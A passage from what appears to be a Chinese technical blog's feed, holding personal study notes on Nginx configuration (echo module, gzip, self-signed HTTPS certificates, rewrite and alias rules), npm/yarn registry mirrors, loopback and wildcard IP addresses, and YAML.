class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ nginx -V<br></code></pre></td></tr></table></figure><p>在原编译选项的基础上添加对 echo 模块的编译.</p><p>如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ./configure \<br>--prefix=/usr/local/nginx \<br>--with-http_ssl_module \ <br>--add-module=/root/echo-nginx-module<br>$ make<br></code></pre></td></tr></table></figure><p>这样就是重新编译.</p><h4 id="3-备份并复制-nginx-的可执行文件"><a href="#3-备份并复制-nginx-的可执行文件" class="headerlink" title="3. 备份并复制 nginx 的可执行文件"></a>3. 备份并复制 nginx 的可执行文件</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">cd</span> objs<br>$ <span class="hljs-built_in">mv</span> /usr/local/nginx/sbin/nginx /usr/local/nginx/sbin/nginx.bak<br>$ <span class="hljs-built_in">cp</span> nginx /usr/local/nginx/sbin/nginx<br></code></pre></td></tr></table></figure><p>使用 <code>echo</code> 指令输出字符串:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> / &#123;<br>    <span class="hljs-attribute">root</span> html;<br>    <span class="hljs-attribute">index</span> index.html index.htm;<br>    <span class="hljs-attribute">default_type</span> text/plain;<br>    <span class="hljs-attribute">echo</span> <span class="hljs-string">&quot;This is an echo module.&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="7-2-2-常见的应用案例"><a href="#7-2-2-常见的应用案例" class="headerlink" title="7.2.2 常见的应用案例"></a>7.2.2 常见的应用案例</h3><p><code>echo-nginx-module</code> 中最常用的就是 echo 指令, 且该指令只能在 location 块或 location 块下 if 指令中使用.</p><h2 id="7-3-查看响应状态与响应内容"><a href="#7-3-查看响应状态与响应内容" class="headerlink" title="7.3 查看响应状态与响应内容"></a>7.3 查看响应状态与响应内容</h2><h3 id="7-3-1-安装所需模块"><a href="#7-3-1-安装所需模块" class="headerlink" title="7.3.1 安装所需模块"></a>7.3.1 安装所需模块</h3><p>利用 <code>ngx_http_stub_status_module</code> 和 <code>ngx_http_sub_module</code> 模块.</p><p>在 <code>./configure</code> 时添加:</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript">--<span class="hljs-keyword">with</span>-http_stub_status_module <span class="hljs-string">\</span><br>--<span class="hljs-keyword">with</span>-http_sub_module<br></code></pre></td></tr></table></figure><h2 id="7-4-网页压缩传输"><a href="#7-4-网页压缩传输" class="headerlink" title="7.4 网页压缩传输"></a>7.4 网页压缩传输</h2><h3 id="7-4-1-gzip-压缩技术"><a href="#7-4-1-gzip-压缩技术" class="headerlink" title="7.4.1 gzip 压缩技术"></a>7.4.1 gzip 压缩技术</h3><p>gzip (GNU-ZIP) 是一种压缩技术.</p><p>gzip 网页压缩的实现需要浏览器和服务器的支持:<br><img src="/../img/gzip_process.png" alt="gzip"></p><h3 id="7-4-2-网页压缩传输配置"><a href="#7-4-2-网页压缩传输配置" class="headerlink" title="7.4.2 网页压缩传输配置"></a>7.4.2 网页压缩传输配置</h3><p>相关配置指令:<br><img src="/../img/gzip_directives1.png" alt="gzip directives"><br><img src="/../img/gzip_directives2.png" alt="gzip directives"></p><h2 id="7-5-重写与重定向"><a href="#7-5-重写与重定向" class="headerlink" title="7.5 重写与重定向"></a>7.5 重写与重定向</h2><h2 id="7-6-防盗链的配置"><a href="#7-6-防盗链的配置" class="headerlink" title="7.6 防盗链的配置"></a>7.6 防盗链的配置</h2><h2 id="7-7-配置-HTTPS-网站"><a href="#7-7-配置-HTTPS-网站" class="headerlink" title="7.7 配置 HTTPS 网站"></a>7.7 配置 HTTPS 网站</h2><p>想要实现 HTTPS 加密网站, 在服务器端首先要获得 CA (CertificationAuthority) 认证机构颁发的服务器数字证书 (CRT), 然后浏览器在发起 HTTPS 请求时会验证服务器的 CRT 是否合法, 若不合法则给出一个 warning 提示信息, 若合法, 用户在与网站交互时, 所传输的数据都是加密后的数据.</p><p>Nginx 服务器中的 <code>ngx_http_ssl_module</code> 模块用于提供 HTTPS 网站的配置.</p><p>在学习阶段, Nginx 服务器若要获取数字证书, 可以使用 OpenSSL 开源软件将自己作为 CA 为自己颁发证书.</p><h3 id="7-7-2-颁发认证证书"><a href="#7-7-2-颁发认证证书" class="headerlink" title="7.7.2 颁发认证证书"></a>7.7.2 颁发认证证书</h3><p>OpenSSL 是一个非常强大的安全套接字层密码库, 它包含了主要的密码算法, 常用的密钥, 证书封装管理以及 SSL 协议, 证书签发等多种功能.</p><p>OpenSSL 程序由 3 部分组成:</p><ul><li>openssl 命令行工具</li><li>libcrypto 公共加密库</li><li>libssl 实现 SSL 协议</li></ul><h4 id="1-生成服务器的-RSA-私钥"><a href="#1-生成服务器的-RSA-私钥" class="headerlink" title="1. 生成服务器的 RSA 私钥"></a>1. 生成服务器的 RSA 私钥</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">mkdir</span> /usr/local/nginx/conf/ssl<br>$ <span class="hljs-built_in">cd</span> /usr/local/nginx/conf/ssl<br>$ openssl genrsa -out server.key 2048<br></code></pre></td></tr></table></figure><p><code>openssl</code> 的参数及含义:</p><ul><li><code>genrsa</code>, 生成 rsa 私钥</li><li><code>-out server.key</code>, 表示输出的文件名为 <code>server.key</code>, 文件所在目录为执行 <code>openssl</code> 命令时所在目录</li><li><code>2048</code>, 密钥长度, 越长, 安全性越强.</li></ul><h4 id="2-生成服务器的-CSR-证书请求文件"><a href="#2-生成服务器的-CSR-证书请求文件" class="headerlink" title="2. 生成服务器的 CSR 证书请求文件"></a>2. 生成服务器的 CSR 证书请求文件</h4><p>CSR 是 Certificate Signing Request 的简称 (直接翻译过来就是 “证书签发请求” 这个东西当作公钥用, 也就是用来加密).</p><p>CSR 证书请求文件是服务器的公钥, 用于提交给 CA 机构进行签名.</p><p>生成 CSR:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ openssl req -new -key server.key -out server.csr<br></code></pre></td></tr></table></figure><p><code>req</code> 表示证书签发申请.</p><p><code>-new</code> 表示新请求.</p><p><code>-key server.key</code> 指定私钥为 <code>server.key</code>. k</p><p><code>-out server.csr</code> 表示生成的 CSR 证书请求文件名称为 <code>server.csr</code>.<br><img src="/../img/csr_args.png" alt="openssl 生成 CSR 参数含义"></p><p>这里, 私钥用于对数据进行数字签名, 签名后的数据可以利用公钥进行验证.</p><h4 id="3-CA-为服务器认证证书"><a href="#3-CA-为服务器认证证书" class="headerlink" title="3. CA 为服务器认证证书"></a>3. CA 为服务器认证证书</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ openssl x509 -req -days 30 \<br>-<span class="hljs-keyword">in</span> server.car -signkey server.key -out server.crt<br></code></pre></td></tr></table></figure><p>使用 CA 的私钥 <code>server.key</code> 为服务器的 CSR 证书申请文件 <code>server.csr</code> 进行签名认证.</p><p><code>x509</code> 是签名证书格式. <code>-days 30</code> 用于设置签发证书的有效期.</p><h3 id="7-7-3-配置-HTTPS-网站"><a href="#7-7-3-配置-HTTPS-网站" class="headerlink" title="7.7.3 配置 HTTPS 网站"></a>7.7.3 配置 HTTPS 网站</h3><p>需要在编译安装 Nginx 时添加对 <code>ngx_http_ssl_module</code> 模块的支持.</p><p>示例 <code>nginx.conf</code> 内容:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">server &#123;<br>    listen <span class="hljs-number">443</span>;<br>    server_name www.test.com;<br>    root html/test.com;<br>    ssl on;<br>    ssl_certificate     <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>conf<span class="hljs-regexp">/ssl/</span>server.crt;<br>    ssl_certificate_key <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>conf<span class="hljs-regexp">/ssl/</span>server.key;<br>&#125;<br></code></pre></td></tr></table></figure><p>443 端口专门用于 HTTPS.</p><p><code>ssl on</code> 开启 Nginx 对 SSL 的支持.</p><p><code>ssl_certificate</code> 指定 CRT 文件.</p><p><code>ssl_certificate_key</code> 指定服务器私钥.</p>]]></content>
    
    
    <categories>
      
      <category>Nginx</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>对-Nginx-的理解</title>
    <link href="/2022/10/02/%E5%AF%B9-Nginx-%E7%9A%84%E7%90%86%E8%A7%A3/"/>
    <url>/2022/10/02/%E5%AF%B9-Nginx-%E7%9A%84%E7%90%86%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>就是你向计算机发起一个请求, 即你要打开某台主机上面的一个页面, Nginx 就会让你找到这个页面在哪里并且把它打开.</p><h1 id="docker-容器的例子"><a href="#docker-容器的例子" class="headerlink" title="docker 容器的例子"></a>docker 容器的例子</h1><p>容器里面运行 Nginx 服务器. 这个 Nginx 监听 80 端口, 而这个 80 端口又是映射到宿主机的 49153 端口, 意思就是, 你向宿主机的 49153 端口发起的请求会被容器中的 Nginx 所捕获. 就达到了效果.</p><h1 id="关于配置文件"><a href="#关于配置文件" class="headerlink" title="关于配置文件"></a>关于配置文件</h1><p>location 块里面的 <code>index</code> 才是打开页面.</p>]]></content>
    
    
    <categories>
      
      <category>Nginx</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-yarn</title>
    <link href="/2022/10/02/%E5%85%B3%E4%BA%8E-yarn/"/>
    <url>/2022/10/02/%E5%85%B3%E4%BA%8E-yarn/</url>
    
    <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/267176704">参考</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>管理-npm-的版本</title>
    <link href="/2022/10/02/%E7%AE%A1%E7%90%86-npm-%E7%9A%84%E7%89%88%E6%9C%AC/"/>
    <url>/2022/10/02/%E7%AE%A1%E7%90%86-npm-%E7%9A%84%E7%89%88%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<p><a href="https://stackoverflow.com/questions/47008159/how-to-downgrade-node-version">参考</a><br>使用 <code>n</code> 这个工具:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ cnpm install -g n<br>$ n 6.10.3<br></code></pre></td></tr></table></figure><p><code>n</code> 后面跟版本号.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>npm-和-yarn-换源</title>
    <link href="/2022/10/02/npm-%E5%92%8C-yarn-%E6%8D%A2%E6%BA%90/"/>
    <url>/2022/10/02/npm-%E5%92%8C-yarn-%E6%8D%A2%E6%BA%90/</url>
    
    <content type="html"><![CDATA[<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ yarn config get registry<br>$ yarn config <span class="hljs-built_in">set</span> registry <span class="hljs-string">&#x27;https://registry.npm.taobao.org&#x27;</span><br>$ npm config get registry<br>$ npm config <span class="hljs-built_in">set</span> registry <span class="hljs-string">&#x27;https://registry.npm.taobao.org&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="几个可能能用的源"><a href="#几个可能能用的源" class="headerlink" title="几个可能能用的源"></a>几个可能能用的源</h1><pre><code class="hljs">npm -----  https://registry.npmjs.org/cnpm ----  http://r.cnpmjs.org/taobao --  https://registry.npm.taobao.org/nj ------  https://registry.nodejitsu.com/rednpm -- http://registry.mirror.cqupt.edu.cn skimdb -- https://skimdb.npmjs.com/registry</code></pre><h1 id="yarn"><a href="#yarn" class="headerlink" title="yarn"></a>yarn</h1><p>原本的源好像是 <code>https://registry.yarnpkg.com</code></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-0.0.0.0-和-127.0.0.1-这两个-IP-地址</title>
    <link href="/2022/10/02/%E5%85%B3%E4%BA%8E-0-0-0-0-%E5%92%8C-127-0-0-1-%E8%BF%99%E4%B8%A4%E4%B8%AA-IP-%E5%9C%B0%E5%9D%80/"/>
    <url>/2022/10/02/%E5%85%B3%E4%BA%8E-0-0-0-0-%E5%92%8C-127-0-0-1-%E8%BF%99%E4%B8%A4%E4%B8%AA-IP-%E5%9C%B0%E5%9D%80/</url>
    
    <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/72988255">参考1</a><br><a href="https://www.cnblogs.com/FengZeng666/p/12519377.html">参考2</a></p><h1 id="关于-0-0-0-0"><a href="#关于-0-0-0-0" class="headerlink" title="关于 0.0.0.0"></a>关于 <code>0.0.0.0</code></h1><p>在服务器中, <code>0.0.0.0</code> 指本机上的所有 IPV4 地址. 如果一个主机有两个 IP 地址, <code>192.168.1.1</code> 和 <code>10.1.2.1</code>, 并且该主机上的一个服务监听的地址是 <code>0.0.0.0</code>, 那么两个 ip 地址都能访问到该服务. 也就是说, 监听 <code>0.0.0.0</code> 等同于同时监听了两个 ip.</p><p>在路由中, <code>0.0.0.0</code> 表示的是默认路由, 即当路由表中没有找到完全匹配的路由时所对应的路由.</p><p>当一台主机还没有被分配一个 IP 地址的时候, 用于表示主机本身.</p><h1 id="关于-127-0-0-1"><a href="#关于-127-0-0-1" class="headerlink" title="关于 127.0.0.1"></a>关于 <code>127.0.0.1</code></h1><p>首先这是一个 IPV4 地址.</p><p>网络号为 <code>127</code> 的地址 (即以 127 开头的 ip) 都被称为回环地址 (Loopback Address). 其是一种 IPV4 的特殊地址.</p><p>在 IPV4 下的回环地址是 <code>127.0.0.1</code>, 在 IPV6 下, 表达为 <code>::1</code></p><p>在 IPV4 下用的是 <code>ping 127.0.0.1</code> 命令.</p><p>在 IPV6 下用的是 <code>ping6 ::1</code> 命令.</p><h2 id="什么是-ping"><a href="#什么是-ping" class="headerlink" title="什么是 ping"></a>什么是 ping</h2><p>ping 是应用层命令.</p><p>ping 应用的底层, 用的是网络层的 ICMP 协议.</p><p>本质上, ping 和普通应用发消息在程序流程上没有太大差别.</p><h2 id="为什么叫回环地址-参考"><a href="#为什么叫回环地址-参考" class="headerlink" title="为什么叫回环地址 参考"></a>为什么叫回环地址 <a href="https://blog.csdn.net/u010783226/article/details/119382949">参考</a></h2><p>ping 向回环地址发送数据包的路线为: 应用层-传输层-网络层-数据链路层-网络层-传输层-应用层.</p><p>目标地址为回环地址时, 消息又发送到本地网卡. 并不会传输到网络中.<br><img src="/../img/loop_back.png" alt="Loopback"></p><p>ping 本机 IP 跟 ping 回环地址一样, 相关的网络数据, 都是走 lo0 (本地回环接口).</p><h1 id="127-0-0-1-和-localhost-以及-0-0-0-0-的区别"><a href="#127-0-0-1-和-localhost-以及-0-0-0-0-的区别" class="headerlink" title="127.0.0.1 和 localhost 以及 0.0.0.0 的区别"></a><code>127.0.0.1</code> 和 localhost 以及 <code>0.0.0.0</code> 的区别</h1><p>localhost 不是 ip, 而是一个域名. 只不过会默认把它解析为 <code>127.0.0.1</code>, 因此 <code>/etc/hosts</code> 下实际上就是把 <code>127.0.0.1</code> 映射到 localhost 上.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-nginx-配置文件中-server_name-为_</title>
    <link href="/2022/10/02/%E5%85%B3%E4%BA%8E-nginx-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD-server_name-%E4%B8%BA_/"/>
    <url>/2022/10/02/%E5%85%B3%E4%BA%8E-nginx-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD-server_name-%E4%B8%BA_/</url>
    
    <content type="html"><![CDATA[<p><code>server_name    _;</code> 这里只是表示一个无效的域名.</p>]]></content>
    
    
    <categories>
      
      <category>Nginx</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>菜鸟教程-YAML-入门</title>
    <link href="/2022/10/02/%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B-YAML-%E5%85%A5%E9%97%A8/"/>
    <url>/2022/10/02/%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B-YAML-%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.runoob.com/w3cnote/yaml-intro.html">菜鸟教程</a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>YAML 是 “YAML Ain’t a Markup Language” 的递归缩写或 “Yet Another Markup Language”.</p><p>一般用来写配置文件.</p><p>YAML 的配置文件后缀为 <code>.yml</code>.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki-关于-Zim-部分</title>
    <link href="/2022/10/02/ArchWiki-%E5%85%B3%E4%BA%8E-Zim-%E9%83%A8%E5%88%86/"/>
    <url>/2022/10/02/ArchWiki-%E5%85%B3%E4%BA%8E-Zim-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Zim 是一个图形化文本编辑器, 用于维护 wiki pages.</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>安装 <code>zim</code> 包或者 AUR 中的 <code>zim-git</code>.</p>]]></content>
    
    
    <categories>
      
      <category>Zim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>高性能Linux服务器构建实战-Notes</title>
    <link href="/2022/10/02/%E9%AB%98%E6%80%A7%E8%83%BDLinux%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98-Notes/"/>
    <url>/2022/10/02/%E9%AB%98%E6%80%A7%E8%83%BDLinux%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="第10章-高性能-Web-服务器-Nginx-engine-x"><a href="#第10章-高性能-Web-服务器-Nginx-engine-x" class="headerlink" title="第10章 高性能 Web 服务器 Nginx (engine x)"></a>第10章 高性能 Web 服务器 Nginx (engine x)</h1><h3 id="10-1-1-Nginx-的组成与工作原理"><a href="#10-1-1-Nginx-的组成与工作原理" class="headerlink" title="10.1.1 Nginx 的组成与工作原理"></a>10.1.1 Nginx 的组成与工作原理</h3><p>Nginx 仅仅通过查找配置文件将客户端的请求映射到一个 location block.</p><p>location block 用于 URL 匹配.</p><p>Nginx 的模块直接被编译进 Nginx, 属于静态编译方式.</p><p>模块感觉相当与插件, 包含一些指令.</p><p>在解析配置文件时, Nginx 的每个模块都有可能去处理某个请求, 但是同一个请求只能由一个模块来完成.</p><h2 id="10-3-配置与调试-Nginx"><a href="#10-3-配置与调试-Nginx" class="headerlink" title="10.3 配置与调试 Nginx"></a>10.3 配置与调试 Nginx</h2><h3 id="10-3-1-Nginx-配置文件结构"><a href="#10-3-1-Nginx-配置文件结构" class="headerlink" title="10.3.1 Nginx 配置文件结构"></a>10.3.1 Nginx 配置文件结构</h3><p><img src="/../img/file_structure.png" alt="Nginx 配置文件结构"></p><h3 id="10-3-2-Nginx-配置文件详解"><a href="#10-3-2-Nginx-配置文件详解" class="headerlink" title="10.3.2 Nginx 配置文件详解"></a>10.3.2 Nginx 配置文件详解</h3><p>location 中的 <code>expires</code> 指令用来指定静态文件的过期时间.</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> <span class="hljs-regexp">~ .*.jsp$</span> &#123;<br>    <span class="hljs-attribute">index</span> index.jsp;<br>    <span class="hljs-attribute">proxy_pass</span> http://localhost:8080;<br>&#125;<br></code></pre></td></tr></table></figure><p>这一段将所有以 <code>.jsp</code> 后缀的文件都交给本机的 8080 端口处理.</p><p>错误信息的返回页面的大小要超过 512KB, 否则会被 IE 浏览器替换为 IE 默认的错误页面.</p><h3 id="10-3-3-Nginx-日常维护技巧"><a href="#10-3-3-Nginx-日常维护技巧" class="headerlink" title="10.3.3 Nginx 日常维护技巧"></a>10.3.3 Nginx 日常维护技巧</h3><h4 id="1-Nginx-配置正确性检查"><a href="#1-Nginx-配置正确性检查" class="headerlink" title="1. Nginx 配置正确性检查"></a>1. Nginx 配置正确性检查</h4><p>配置文件调试功能:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ /usr/local/nginx/sbin/nginx -t<br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ /usr/local/nginx/sbin/nginx -t -c /usr/local/nginx/conf/nginx.conf<br></code></pre></td></tr></table></figure><p><code>-t</code> 参数用于检查配置文件是否正确, 但并不执行.</p><p><code>-c</code> 参数用于指定配置文件路径, 不指定的话默认到安装目录下查找 <code>conf/nginx.conf</code></p><h2 id="10-4-Nginx-常用功能介绍"><a href="#10-4-Nginx-常用功能介绍" class="headerlink" title="10.4 Nginx 常用功能介绍"></a>10.4 Nginx 常用功能介绍</h2><h3 id="10-4-1-Nginx-反向代理应用实例"><a href="#10-4-1-Nginx-反向代理应用实例" class="headerlink" title="10.4.1 Nginx 反向代理应用实例"></a>10.4.1 Nginx 反向代理应用实例</h3><p>当一台代理服务器能够代理外部网络上的访问请求来访问内部网络时, 这种代理服务的方式称为反向代理.</p><h4 id="1-多域名跳转应用实例"><a href="#1-多域名跳转应用实例" class="headerlink" title="1. 多域名跳转应用实例"></a>1. 多域名跳转应用实例</h4><p>一个网站可以有多个域名.</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">server www.tb.com<br>location / &#123;<br>proxy_pass http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">66.90</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/web/</span>;<br>&#125;<br>location /admin &#123;<br>proxy_pass http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">66.90</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/admin/</span>;<br>&#125;<br>server m.tb.com<br>location / &#123;<br>proxy_pass http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">66.90</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/wap/</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-通过-Nginx-重定向实现新旧域名过渡"><a href="#2-通过-Nginx-重定向实现新旧域名过渡" class="headerlink" title="2. 通过 Nginx 重定向实现新旧域名过渡"></a>2. 通过 Nginx 重定向实现新旧域名过渡</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">server_name</span> www.taob.com;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/(.*)$</span> http://www.tb.com/<span class="hljs-variable">$1</span> <span class="hljs-literal">permanent</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>rewrite</code> 模块用于重定向.</p><h4 id="3-alias-在-Nginx-下的应用"><a href="#3-alias-在-Nginx-下的应用" class="headerlink" title="3. alias 在 Nginx 下的应用"></a>3. alias 在 Nginx 下的应用</h4><p>设置别名的功能:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">location /i &#123;<br>    alias <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/im</span>ages/;<br>&#125;<br></code></pre></td></tr></table></figure><p>将请求中的 <code>/i</code> 替换为 <code>/var/www/html/images/</code>.</p><p>还比如:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">location ~ ^<span class="hljs-regexp">/download/</span>(.*)$ &#123;<br>    alias <span class="hljs-regexp">/home/</span>webdata<span class="hljs-regexp">/www/</span><span class="hljs-variable">$1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的 <code>$1</code> 是引用正则表达式中捕获的内容.</p><p>在 Nginx 中, alias 命令和 root 命令有些类似, 但还是有差别.</p><p>alias 指定的目录是当前目录, 而 root 指定的是根目录.</p><p>一般情况下, 建议在 <code>location /</code> 中通过 root 命令来配置根目录, 而在其他目录配置的位置使用 alias 命令.</p><h4 id="location-命令应用实例"><a href="#location-命令应用实例" class="headerlink" title="location 命令应用实例"></a>location 命令应用实例</h4><p>实现 IP 访问控制, 需要使用 <code>ngx_http_access_module</code> 模块 (也就是编译时加入这个模块), 如:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> / &#123;<br>    <span class="hljs-attribute">deny</span> <span class="hljs-number">192.168.66.80</span>;<br>    <span class="hljs-attribute">allow</span> <span class="hljs-number">192.168.66.0</span>/<span class="hljs-number">24</span>;<br>    <span class="hljs-attribute">deny</span> all;<br>&#125;<br></code></pre></td></tr></table></figure><p>禁止访问某个目录:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">location</span> <span class="hljs-title">~ ^/(WEB-INF</span>)/ &#123;<br>    <span class="hljs-keyword">deny</span> all;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="10-4-2-Nginx-的-URL-重新应用实例"><a href="#10-4-2-Nginx-的-URL-重新应用实例" class="headerlink" title="10.4.2 Nginx 的 URL 重新应用实例"></a>10.4.2 Nginx 的 URL 重新应用实例</h3><p>常见的 URL 重写模块命令有 if, rewrite, set, break 等.</p><h4 id="1-if-命令"><a href="#1-if-命令" class="headerlink" title="1. if 命令"></a>1. if 命令</h4><p>语法和 C 语言一样.</p><p>可以在 server, location 部分使用.</p><p>几个可以在判断部分使用的匹配.</p><p>正则匹配:</p><ul><li><code>~</code>, 区分大小写匹配</li><li><code>~*</code>, 不区分大小写匹配</li><li><code>!~</code> 和 <code>!~*</code>, 非</li></ul><p>文件及目录匹配, 这里和 shell script 差不多:</p><ul><li><code>-f</code>, 是否是文件</li><li><code>-d</code>, 是否是目录</li><li><code>-e</code>, 是否存在</li><li><code>-x</code>, 文件是否可执行</li></ul><p>Nginx 配置文件的内置变量:<br><img src="/../img/internal_var.png" alt="内置变量"></p><h4 id="2-rewrite-命令"><a href="#2-rewrite-命令" class="headerlink" title="2. rewrite 命令"></a>2. rewrite 命令</h4><p>Nginx 通过 <code>ngx_http_rewrite_module</code> 模块支持 URL 重写和 if 条件判断, 但要使用 rewrite 功能, 需要 pcre 支持, 应在编译 Nginx 时指定 pcre 源码目录.</p><p>语法是:</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-built_in">rewrite</span> regex flag<br></code></pre></td></tr></table></figure><p>可以在 server, location, if 部分使用.</p><p>主要的 flag 标记:</p><ul><li>last</li><li>break</li><li>redirect</li><li>permanent</li></ul><h4 id="3-set-命令"><a href="#3-set-命令" class="headerlink" title="3. set 命令"></a>3. set 命令</h4><p><code>set</code> 命令可以设置一个变量并为其赋值.</p><p>不能使用 <code>set</code> 设置 <code>$http_xxx</code> 头部变量的值.</p><p>语法:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> <span class="hljs-keyword">variable</span> <span class="hljs-comment">value</span><br></code></pre></td></tr></table></figure><p>可以在 server, location, if 字段中使用.</p><p>如:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> / &#123;<br><span class="hljs-attribute">proxy_pass</span> 